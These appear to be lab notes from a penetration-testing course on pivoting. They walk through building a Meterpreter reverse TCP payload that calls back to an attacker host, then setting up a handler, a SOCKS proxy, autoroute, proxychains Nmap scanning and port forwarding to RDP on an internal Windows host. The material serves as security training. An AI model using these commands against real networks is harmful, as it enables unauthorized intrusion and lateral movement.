# Attack Host
## Windows Host is on the 172.16.5.0/23
1. Create a Meterpreter shell for the Ubuntu server with the below command, which will return a shell on our attack host on port 8080.
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```
2. Transfer the payload using `scp` to Ubuntu Pivot Host
3. Start a multi/handler, also known as a Generic Payload Handler.
```
use exploit/multi/handler
```
```
set lport 8080
```
```
set payload linux/x64/meterpreter/reverse_tcp
```
```
run
```
4. Execute `backupjob` on Ubuntu Pivot Host
5. Meterpreter session opened
6. Perform a ping sweep using the meterpreter session
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

There could be scenarios when a host's firewall blocks ping (ICMP), and the ping won't get us successful replies. In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
## Configuring MSF's SOCKS Proxy
```
use auxiliary/server/socks_proxy
```
```
set SRVPORT 9050
```
```
set SRVHOST 0.0.0.0
```
```
set version 4a
```
```
run
```
After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host.
```
socks4 127.0.0.1 9050
```
Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
```
use post/multi/manage/autoroute
```
```
set session 1
```
```
set SUBNET 172.16.5.0
```
```
run
```
It is also possible to add routes with autoroute by running autoroute from the Meterpreter session
```
run autoroute -s 172.16.5.0/23
```
### Testing Proxy & Routing Functionality
```
w1j0y@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```
## Port Forwarding
After establishing a meterpreter session
```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
The above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.
Connecting to Windows Target through localhost
